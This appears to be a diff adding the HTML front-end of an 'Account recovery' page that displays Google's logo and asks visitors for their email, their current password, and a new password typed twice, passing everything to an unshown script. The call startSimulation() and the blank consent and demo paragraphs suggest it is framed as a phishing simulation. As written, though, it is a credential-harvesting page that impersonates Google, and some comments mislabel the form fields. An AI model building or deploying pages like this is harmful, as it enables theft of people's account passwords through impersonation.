@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Account Recovery</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+<div class="wrapper">
+  <div class="card">
+
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo"/>
+
+    <h2 id="title">Account recovery</h2>
+    <p class="sub">Verify your identity</p>
+
+    <!-- CONSENT -->
+    <div id="consent" class="form active">
+      <p class="info"></p>
+      <button onclick="startSimulation()">Continue</button>
+    </div>
+
+    <!-- STEP 1 EMAIL -->
+    <form id="step1" class="form">
+      <div class="input-group">
+        <input type="email" id="email" required autocomplete="email" />
+        <label>Email</label>
+      </div>
+      <button type="submit">Next</button>
+    </form>
+
+    <!-- SECURITY SCREEN -->
+    <div id="security" class="form">
+      <p class="info">Checking your account...</p>
+      <div class="loader"></div>
+    </div>
+
+    <!-- OTP (CURRENT PASSWORD FIELD AS YOU KEPT) -->
+    <form id="step2" class="form">
+      <div class="input-group">
+        <input type="password" id="otp" required autocomplete="current-password" />
+        <label>Enter current password</label>
+      </div>
+      <button type="submit">Verify</button>
+    </form>
+
+    <!-- LAST NAME (SET NEW PASSWORD STEP AS YOU KEPT) -->
+    <form id="stepLast" class="form">
+      <div class="input-group">
+        <input type="password" id="lastname" required autocomplete="new-password" />
+        <label>Set new password</label>
+      </div>
+      <button type="submit">Next</button>
+    </form>
+
+    <!-- NEW PASSWORD -->
+    <form id="step3" class="form">
+      <div class="input-group">
+        <input type="password" id="newpass" required autocomplete="new-password" />
+        <label>Retype new password</label>
+      </div>
+      <button type="submit">Update</button>
+    </form>
+
+    <p class="demo"></p>
+
+  </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
